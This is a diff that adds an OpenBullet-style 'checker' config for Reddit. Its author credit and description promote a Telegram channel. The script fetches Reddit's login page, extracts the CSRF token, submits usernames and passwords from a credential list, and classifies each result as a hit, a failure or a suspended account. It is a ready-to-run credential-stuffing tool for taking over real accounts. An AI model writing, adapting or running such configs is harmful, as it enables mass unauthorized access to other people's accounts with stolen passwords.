@@ -1,0 +1,89 @@
+[SETTINGS]
+{
+  "Name": "Reddit",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-28T12:01:01.8097458+00:00",
+  "AdditionalInfo": "GO TO TELEGRAM CH @ZZOLY",
+  "RequiredPlugins": [],
+  "Author": "@ZOLY69",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "GO TO TELEGRAM CH @ZZOLY",
+      "VariableName": "",
+      "Id": 336828194
+    }
+  ],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Replace "@.*" "" UseRegex=TRUE "<USER>" -> VAR "U" 
+
+REQUEST GET "https://www.reddit.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "name=\"csrf_token\" value=\"" "\">" -> VAR "srf" 
+
+REQUEST POST "https://www.reddit.com/login" 
+  CONTENT "csrf_token=<srf>&otp=&password=<PASS>&dest=https%3A%2F%2Fwww.reddit.com&username=<U>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept-ranges: bytes" 
+  HEADER "cache-control: no-store, max-age=0" 
+  HEADER "content-length: 103" 
+  HEADER "content-security-policy: frame-ancestors 'self' https://*.reddit.com" 
+  HEADER "content-type: application/json; charset=UTF-8" 
+  HEADER "date: Mon, 13 Sep 2021 22:39:29 GMT" 
+  HEADER "expires: 0" 
+  HEADER "pragma: no-cache" 
+  HEADER "server: snooserv" 
+  HEADER "strict-transport-security: max-age=15552000; includeSubDomains; preload" 
+  HEADER "via: 1.1 varnish" 
+  HEADER "x-clacks-overhead: GNU Terry Pratchett" 
+  HEADER "x-content-type-options: nosniff" 
+  HEADER "x-frame-options: SAMEORIGIN" 
+  HEADER "x-xss-protection: 1; mode=block" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "INCORRECT_USERNAME_PASSWORD" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "\"dest\"" 
+
+REQUEST GET "https://www.reddit.com/user/<U>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "We have suspended your account" 
+
